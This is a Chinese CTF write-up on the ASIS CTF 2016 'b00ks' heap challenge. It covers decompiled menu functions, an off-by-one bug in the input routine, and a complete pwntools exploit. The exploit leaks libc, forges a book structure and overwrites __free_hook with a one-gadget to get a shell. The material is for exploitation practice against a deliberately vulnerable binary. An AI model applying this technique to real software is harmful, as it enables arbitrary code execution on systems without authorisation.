---
title: Asis_ctf_2016_b00ks
date: 2020-10-18 20:32:28
tags: 
	- PWN
	- heap
---

*ctf wiki上看到的一道堆题,原题的环境是ubuntu16。本文是在ubuntu18上复现的。*

# ASIS CTF 2016 b00ks

![截屏2020-10-18 下午8.46.16](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/OffbyOne/%E6%88%AA%E5%B1%8F2020-10-18%20%E4%B8%8B%E5%8D%888.46.16.png)

除了canary以外保护全开

![截屏2020-10-18 下午8.48.24](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/OffbyOne/%E6%88%AA%E5%B1%8F2020-10-18%20%E4%B8%8B%E5%8D%888.48.24.png)

执行一下发现是个菜单类应用

具体执行内容到ida看一下

```c++
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 savedregs; // [rsp+20h] [rbp+0h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);                  // 
                                                // BooksHeap+i：id
  Welcome();
  EnterAuthName();
  while ( (unsigned int)MainMenu() != 6 )
  {
    switch ( (unsigned int)&savedregs )
    {
      case 1u:
        CreateBook();                           // Off by one
        break;
      case 2u:
        Deletebook();                           // 没用从+6开始free，从+8开始free
        break;
      case 3u:
        EditBook();                             // description位置与DeleteBook()一致
        break;
      case 4u:
        OutPutBooks();
        break;
      case 5u:
        EnterAuthName();                        // Off by one 
        break;
      default:
        puts("Wrong option");
        break;
    }
  }
  puts("Thanks to use our library software");
  return 0LL;
}
```

多数函数已经经过重命名，并注释了一些信息（没什么用）

## 函数分析

### CreateBook()

```c++
signed __int64 CreateBook()
{
  int Size; // [rsp+0h] [rbp-20h]
  int NewBookId; // [rsp+4h] [rbp-1Ch]
  void *NewBookHeap; // [rsp+8h] [rbp-18h]
  void *BookNameHeap; // [rsp+10h] [rbp-10h]
  void *DescriptionHeap; // [rsp+18h] [rbp-8h]

  Size = 0;
  printf("\nEnter book name size: ", *(_QWORD *)&Size);
  __isoc99_scanf("%d", &Size);
  if ( Size >= 0 )
  {
    printf("Enter book name (Max 32 chars): ", &Size);
    BookNameHeap = malloc(Size);
    if ( BookNameHeap )
    {
      if ( (unsigned int)input_BUG(BookNameHeap, Size - 1) )
      {
        printf("fail to read name");
      }
      else
      {
        Size = 0;
        printf("\nEnter book description size: ", *(_QWORD *)&Size);
        __isoc99_scanf("%d", &Size);
        if ( Size >= 0 )
        {
          DescriptionHeap = malloc(Size);
          if ( DescriptionHeap )
          {
            printf("Enter book description: ", &Size);
            if ( (unsigned int)input_BUG(DescriptionHeap, Size - 1) )// 没有多循环
            {
              printf("Unable to read description");
            }
            else
            {
              NewBookId = AssignBookNumber();
              if ( NewBookId == -1 )
              {
                printf("Library is full");
              }
              else
              {                                 // 未满
                NewBookHeap = malloc(0x20uLL);
                if ( NewBookHeap )
                {
                  *((_DWORD *)NewBookHeap + 6) = Size;
                  *((_QWORD *)BooksZone + NewBookId) = NewBookHeap;
                  *((_QWORD *)NewBookHeap + 2) = DescriptionHeap;
                  *((_QWORD *)NewBookHeap + 1) = BookNameHeap;
                  *(_DWORD *)NewBookHeap = ++unk_202024;
                  return 0LL;
                }
                printf("Unable to allocate book struct");
              }
            }
          }
          else
          {
            printf("Fail to allocate memory", &Size);
          }
        }
        else
        {
          printf("Malformed size", &Size);
        }
      }
    }
    else
    {
      printf("unable to allocate enough space");
    }
  }
  else
  {
    printf("Malformed size", &Size);
  }
  if ( BookNameHeap )
    free(BookNameHeap);
  if ( DescriptionHeap )
    free(DescriptionHeap);
  if ( NewBookHeap )
    free(NewBookHeap);
  return 1LL;
}
```

执行函数是会先让用户输入书名的大小，然后再输入书名。书本描述也是先输入描述大小再输入描述。两次字符串输入都是通过一个开发者自定的输入函数实现的。

#### input_BUG()



```c++
signed __int64 __fastcall input_BUG(_BYTE *a1, int _32)
{
  int i; // [rsp+14h] [rbp-Ch]
  _BYTE *_addr; // [rsp+18h] [rbp-8h]

  if ( _32 <= 0 )
    return 0LL;
  _addr = a1;
  for ( i = 0; ; ++i )
  {
    if ( (unsigned int)read(0, _addr, 1uLL) != 1 )
      return 1LL;
    if ( *_addr == '\n' )
      break;
    ++_addr;
    if ( i == _32 )                             // 等于a2就跳出
      break;
  }
  *_addr = 0;
  return 0LL;
}
```

这个开发者自定义的输入函数被我标记了BUG，是因为它在line 16处确实存在一个漏洞，在line 9可以看到计数器i从0开始，当等于32时结束。但这个if判断在循环体下方执行，也就是说判断到i==32时其实又执行了一次循环体，实际上我们这个循环执行了33次。我们可以比开发者设想的多写入一个字节，也就是Off by one。（当然有可能开发者本就想让用户输入33个字节，稍后我们会知道我们确实超出了开发者预期）

#### AssignBookNumber()

在CreateBook()函数的line 39处有一个AssignBookNumber()

```c++
signed __int64 AssignBookNumber()
{
  signed int i; // [rsp+0h] [rbp-4h]

  for ( i = 0; i <= 19; ++i )                   // 实际执行20次，最多存20本书
  {
    if ( !*((_QWORD *)BooksZone + i) )          // 似乎可以访问到off_202018的数据
      return (unsigned int)i;
  }
  return 0xFFFFFFFFLL;
}
```

这个函数很简单作用是分配书本id。

### DeleteBook()

```c++
signed __int64 Deletebook()
{
  int v1; // [rsp+8h] [rbp-8h]
  int i; // [rsp+Ch] [rbp-4h]

  i = 0;
  printf("Enter the book id you want to delete: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 > 0 )
  {
    for ( i = 0; i <= 19 && (!*((_QWORD *)BooksZone + i) || **((_DWORD **)BooksZone + i) != v1); ++i )
      ;
    if ( i != 20 )
    {
      free(*(void **)(*((_QWORD *)BooksZone + i) + 8LL));
      free(*(void **)(*((_QWORD *)BooksZone + i) + 16LL));
      free(*((void **)BooksZone + i));
      *((_QWORD *)BooksZone + i) = 0LL;
      return 0LL;
    }
    printf("Can't find selected book!", &v1);
  }
  else
  {
    printf("Wrong id", &v1);
  }
  return 1LL;
}
```

用户输入书本id，free掉对应书本的结构体。（书本的结构体分析稍后研究）

### EditBook()

```c++
signed __int64 EditBook()
{
  int v1; // [rsp+8h] [rbp-8h]
  int i; // [rsp+Ch] [rbp-4h]

  printf("Enter the book id you want to edit: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 > 0 )
  {
    for ( i = 0; i <= 19 && (!*((_QWORD *)BooksZone + i) || **((_DWORD **)BooksZone + i) != v1); ++i )
      ;
    if ( i == 20 )                              // id过大
    {
      printf("Can't find selected book!", &v1);
    }
    else
    {
      printf("Enter new book description: ", &v1);
      if ( !(unsigned int)input_BUG(
                            *(_BYTE **)(*((_QWORD *)BooksZone + i) + 16LL),
                            *(_DWORD *)(*((_QWORD *)BooksZone + i) + 24LL) - 1) )
        return 0LL;
      printf("Unable to read new description");
    }
  }
  else
  {
    printf("Wrong id", &v1);
  }
  return 1LL;
}
```

输入书本id，通过input_BUG输入新的描述。

### OutPutBooks()

```c++
int OutPutBooks()
{
  __int64 v0; // rax
  signed int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i <= 19; ++i )
  {
    v0 = *((_QWORD *)BooksZone + i);
    if ( v0 )
    {
      printf("ID: %d\n", **((unsigned int **)BooksZone + i));
      printf("Name: %s\n", *(_QWORD *)(*((_QWORD *)BooksZone + i) + 8LL));
      printf("Description: %s\n", *(_QWORD *)(*((_QWORD *)BooksZone + i) + 16LL));
      LODWORD(v0) = printf("Author: %s\n", AuthorName);
    }
  }
  return v0;
}
```

执行后会打印出所有的书。

### EnterAuthName()

```c++
signed __int64 EnterAuthName()
{
  printf("Enter author name: ");
  if ( !(unsigned int)input_BUG(AuthorName, 32) )//AuthorName offset_0x202018
    return 0LL;
  printf("fail to read author_name", 32LL);
  return 1LL;
}
```

执行后通过input_BUG输入作者名。作者名被存入bss段，距离基地址偏移0x202018个字节。

## 对接

了解完所有的函数之后，对于菜单类程序我们最好写一些操作函数来对接程序方便攻击。

```python
#coding=utf-8
from pwn import *
OptionNum=0
context.log_level='debug'
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
res=process('./'+Path)
def CreateBook(NameSize,name,DesSize,description):
    res.recvuntil('> ')
    res.sendline('1')
    res.recvuntil('name size:')
    res.sendline(str(NameSize))
    res.recvuntil('chars):')
    res.sendline(name)
    res.recvuntil('size:')
    res.sendline(str(DesSize))
    res.recvuntil('description:')
    res.sendline(description)
def DeleteBook(BookId):
    print("Deleting...")
    res.recvuntil('> ')
    res.sendline('2')
    res.recvuntil('delete: ')
    res.sendline(str(BookId))
def EditBook(BookId,description):
    res.sendline('3')
    res.recvuntil('edit: ')
    res.sendline(str(BookId))
    res.recvuntil('description: ')
    res.sendline(description)
def ChangeAuthName(name):
    res.recvuntil('> ')
    res.sendline('5')
    res.recv()
    res.sendline(name)
def ShowBooks():
    res.recvuntil('> ')
    res.sendline('4')
    return res.recvuntil('> ')
```

## 深入分析

作者名先输入个N0P3aaaa

![截屏2020-10-19 下午12.27.03](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/OffbyOne/%E6%88%AA%E5%B1%8F2020-10-19%20%E4%B8%8B%E5%8D%8812.27.03.png)

作者名的输入调用了前面的讲过的EnterAuthName()函数，此时的作者名被存入AuthorName。

ctrl+c再vmmap看一下

![截屏2020-10-19 下午12.30.00](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/OffbyOne/%E6%88%AA%E5%B1%8F2020-10-19%20%E4%B8%8B%E5%8D%8812.30.00.png)

基地址就是最上面的红色地址 0x555555754000。加上AuthorName的偏移就可以找到N0P3aaaa在内存中的位置。

![截屏2020-10-19 下午1.12.25](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/OffbyOne/%E6%88%AA%E5%B1%8F2020-10-19%20%E4%B8%8B%E5%8D%881.12.25.png)

第一行指向了数据的地址，也就是0x55555756040，这也是个地址只向第三行的右侧。

输入作者名函数是调用了input_BUG的，所以也存在可以多写入一个字符的问题。我们来测试一下

## 完整EXP

```python
#coding=utf-8
from pwn import *
OptionNum=0
context.log_level='debug'
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
res=process('./'+Path)
def CreateBook(NameSize,name,DesSize,description):
    res.recvuntil('> ')
    res.sendline('1')
    res.recvuntil('name size:')
    res.sendline(str(NameSize))
    res.recvuntil('chars):')
    res.sendline(name)
    res.recvuntil('size:')
    res.sendline(str(DesSize))
    res.recvuntil('description:')
    res.sendline(description)
def DeleteBook(BookId):
    print("Deleting...")
    res.recvuntil('> ')
    res.sendline('2')
    res.recvuntil('delete: ')
    res.sendline(str(BookId))
def EditBook(BookId,description):
    res.sendline('3')
    res.recvuntil('edit: ')
    res.sendline(str(BookId))
    res.recvuntil('description: ')
    res.sendline(description)
def ChangeAuthName(name):
    res.recvuntil('> ')
    res.sendline('5')
    res.recv()
    res.sendline(name)
def ShowBooks():
    res.recvuntil('> ')
    res.sendline('4')
    return res.recvuntil('> ')
res.recvuntil("name: ")
res.sendline('N0P3aaaabbbbbbbbccccccccdddddddd')
CreateBook(128,"n0p3_book1",32,'n0p3_des')
CreateBook(0x21000,"n0p3_book2",0x21000,"n0p3_des")
book1_addr=ShowBooks()
book1_addr=u64(book1_addr[85:91].ljust(8,'\x00'))
print(hex(book1_addr))
fake_book1 = p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)
EditBook(1,fake_book1)
ChangeAuthName("N0P3aaaabbbbbbbbccccccccdddddddd")
Raw=ShowBooks()
print(Raw)
book2_name_addr=u64(Raw[12:18].ljust(8,'\x00'))
print("NameAddr: "+hex(book2_name_addr))
book2_desc_addr=u64(Raw[32:38].ljust(8,'\x00'))
print("DescAddr: "+hex(book2_desc_addr))
#context.terminal = ['tmux','splitw','-v']
#gdb.attach(res)
#print(hex(book2_desc_addr-0x00007ffff79e4000))#0x5b1010
libc_addr=book2_desc_addr-0x5b1010#取得libc基地址
free_hook=libc_addr+libc.symbols['__free_hook']
print(hex(libc.symbols['__free_hook']))
print("free_hook:"+hex(free_hook))
MagicShell=libc_addr+0x4f3c2
EditBook(1,p64(free_hook))
print("Free_hook done")
res.recvuntil('> ')
EditBook(2,p64(MagicShell))
DeleteBook(2)
print("Shell:")
res.interactive()
```

